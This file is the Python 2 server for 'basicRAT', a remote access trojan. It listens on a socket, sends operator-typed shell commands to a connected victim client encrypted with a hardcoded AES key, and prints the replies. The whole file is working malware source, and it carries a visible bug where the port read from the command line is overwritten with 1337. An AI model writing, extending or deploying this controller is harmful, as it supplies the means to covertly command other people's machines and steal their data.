#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import socket
import sys
import time

from Crypto import Random
from Crypto.Cipher import AES

try:
    PORT = int(sys.argv[1])
except:
    print 'Usage: ./basicRAT_server.py <port>'
    sys.exit(1)

HOST = 'localhost'
PORT = 1337
BS   = 16
KEY  = '82e672ae054aa4de6f042c888111686a'


def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)


def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)


def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    
    print 'basicRAT server listening on {}'.format(PORT)
    
    conn, _ = s.accept()
    
    while True:
        cmd = raw_input('> ').rstrip()
        
        if cmd == 'quit':
            sys.exit(0)
        
        conn.send(encrypt(cmd))
        data = conn.recv(2048)
        print decrypt(data)
    
    s.close()


if __name__ == '__main__':
    main()
    